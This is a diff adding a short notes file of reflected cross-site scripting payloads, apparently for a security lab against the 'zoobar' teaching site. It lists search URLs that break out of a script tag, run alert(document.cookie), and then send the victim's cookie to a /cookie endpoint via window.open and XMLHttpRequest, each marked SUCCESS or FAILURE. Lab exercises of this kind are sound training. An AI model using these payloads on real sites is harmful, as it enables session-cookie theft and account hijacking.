@@ -1,0 +1,16 @@
+http://zoobar.org/search?q=</script>jdjdjdjd<script>alert('yo')</script>
+
+http://zoobar.org/search?q=</script><script>alert('yo')</script><script>
+
+http://zoobar.org/search?q=</script><script>alert(document.cookie)</script><script>
+
+http://zoobar.org/search?q=</script><script>window.open('http://zoobar.org/cookie?cookie='%2Bdocument.cookie)</script><script> -- FAILURE
+
+http://zoobar.org/search?q=</script><script>window.open('http://zoobar.org/cookie?cookie='%2Bescape(document.cookie))</script><script> -- SUCCESS
+
+http://zoobar.org/search?q=</script><script>xmlhttp.open('GET', 'http://zoobar.org/cookie?cookie='%2Bescape(document.cookie), false)</script><script> -- FAILURE
+
+http://zoobar.org/search?q=</script><script>xmlhttp.open('GET', 'http://zoobar.org/cookie?cookie='%2Bescape(document.cookie), false); xmlhttp.send()</script><script> -- SUCCESS
+
+xmlhttp.open("GET","ajax_info.txt",true);
+
